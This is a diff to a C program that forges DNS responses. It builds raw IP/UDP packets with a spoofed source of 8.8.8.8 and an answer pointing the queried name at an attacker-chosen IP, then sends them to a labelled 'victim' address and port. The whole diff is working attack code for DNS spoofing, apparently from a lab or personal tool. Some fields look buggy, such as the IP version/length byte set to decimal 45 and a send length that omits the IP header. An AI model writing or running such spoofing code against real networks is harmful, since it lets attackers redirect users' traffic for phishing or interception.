@@ -22,7 +22,7 @@ typedef struct ip_address{
 }ip_address;
 
 /* IPv4 header */
-typedef struct ip_header{
+typedef struct  __attribute__((packed, aligned(1))) ip_header{
     u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
     u_char  tos;            // Type of service 
     u_short tlen;           // Total length 
@@ -35,6 +35,20 @@ typedef struct ip_header{
     ip_address  daddr;      // Destination address
     u_int   op_pad;         // Option + Padding
 }ip_header;
+
+/* IPv4 header */
+typedef struct  __attribute__((packed, aligned(1))) iphead {
+    	uint8_t		ver_ihl;        
+    	uint8_t		tos;            
+    	uint16_t	tlen;           
+    	uint16_t	identification; 
+    	uint16_t	flags_fo;       
+    	uint8_t		ttl;            
+    	uint8_t		proto;          
+    	uint16_t	crc;            
+    	uint32_t	saddr;      
+    	uint32_t	daddr;      
+}iphead;
 
 /* UDP header*/
 typedef struct __attribute__((packed, aligned(1))) udp_header{
@@ -136,35 +150,52 @@ send_spoofed_dns_response(u_char	*dns_req,
 			  uint32_t	*dest_ip,
 			  uint16_t	dest_port) {
 
-	u_char			dns_res[1000], packet[1008];
+	u_char			dns_res[1000]; 
+	struct iphead 		*iph = NULL;
 	dns_response		*spoofed_response = NULL;
 	dns_header		*head = NULL;
 	udp_header		*udp = NULL;
-	int			soc = 0, status = -1;
+	int			soc = 0, status = -1, ip_len = 0;
 	struct sockaddr_in 	victim_addr;
 	char			temp[INET_ADDRSTRLEN];
 	struct chksum_hdr	hdr;
 	char			check_sum[1000];
 
-	memset(dns_res, 0, sizeof(dns_res));
-	memcpy(dns_res, dns_req, len);
+	// ==========
+	iph = (struct iphead *)dns_res;
+    	iph->ver_ihl = 45;
+    	iph->tos = 0;
+	ip_len = (iph->ver_ihl & 0xf)*4; 
+    	iph->tlen = htons(ip_len + 8 + len + sizeof(dns_response)); 
+    	iph->identification = htons(1111);
+    	iph->flags_fo = htons(16384);       
+    	iph->ttl = 255;            
+    	iph->proto = 17;          
+    	iph->crc = 0;            
+    	iph->saddr = inet_addr("8.8.8.8");      
+    	iph->daddr = *dest_ip;
+	//iph->crc = csum((unsigned short *)dns_res, iph->tlen); 
+	// ==========
+	
+	memcpy(dns_res + ip_len + 8, dns_req, len);
 
-	head = (struct dns_header *)dns_res;
+	head = (struct dns_header *)(dns_res + ip_len + 8);
 	head->answer = htons(0x1);
 	head->flags = htons(0x8180);
 
-	spoofed_response = (struct dns_response *)(dns_res + len);
+	spoofed_response = (struct dns_response *)(dns_res + ip_len + len + 8);
 	spoofed_response->name = htons(0xc00c);
 	spoofed_response->type = htons(0x1);
 	spoofed_response->class = htons(0x1);
-	spoofed_response->ttl = htonl(600);
+	spoofed_response->ttl = htonl(4);
 	spoofed_response->len = htons(4);
 	inet_pton(AF_INET, target_ip, &(spoofed_response->ip));
 
 	printf("\nOriginal message:\n");
 	print_payload(dns_req, len);
-	printf("\nSpoofed response:\n");
-	print_payload(dns_res, len + sizeof(dns_response));
+	printf("\nSpoofed DNS response:\n");
+	print_payload(dns_res + ip_len + 8, len + sizeof(dns_response));
+	// ========
 
 	soc = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if (soc < 0) {
@@ -172,18 +203,25 @@ send_spoofed_dns_response(u_char	*dns_req,
 		return -1;
 	}
 
-	udp = (struct udp_header *)packet;
+	int one = 1;
+    	const int *val = &one;
+	status = setsockopt (soc, IPPROTO_IP, IP_HDRINCL, val, sizeof (one));
+	if (status < 0) {
+		printf("unable to set socket option of IP_HDRINCL !\n");
+		assert(0);
+	}
+	// ========
+
+	udp = (struct udp_header *)(dns_res + ip_len);
 	udp->sport = htons(53);
 	udp->dport = dest_port;
 	udp->len = htons(len + sizeof(dns_response) + 8);
-	// ===============
 	udp->crc = 0;
-	// ===============
-	memcpy(packet + 8, dns_res, len + sizeof(dns_response));
 
-        printf("\nTotal packet:\n");
-        print_payload(packet, len + sizeof(dns_response) + 8);
-	
+        printf("\nTotal DNS response:\n");
+        print_payload(dns_res, len + sizeof(dns_response) + 8 + ip_len);
+	// =========
+		
 	bzero((char *) &victim_addr, sizeof(victim_addr));
     	victim_addr.sin_family = AF_INET;
     	victim_addr.sin_port = dest_port;
@@ -193,7 +231,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 	printf("\nVictim IP address = %s\t", temp);
 	printf("Port = %d\n", ntohs(victim_addr.sin_port));
 
-	status = sendto(soc, packet, len + sizeof(dns_response) + 8, 0, 
+	status = sendto(soc, dns_res, len + sizeof(dns_response) + 8, 0, 
 			(struct sockaddr *)&victim_addr, sizeof(victim_addr));
 	if (status < 0) {
 		printf("\nUnable to send packet to victim %d !\n", errno);
@@ -201,6 +239,8 @@ send_spoofed_dns_response(u_char	*dns_req,
 	}
 
 	printf("\nSent spoofed response successfully !\n");
+	// ========
+
 	close(soc);
 	assert(0);
 	return 0;
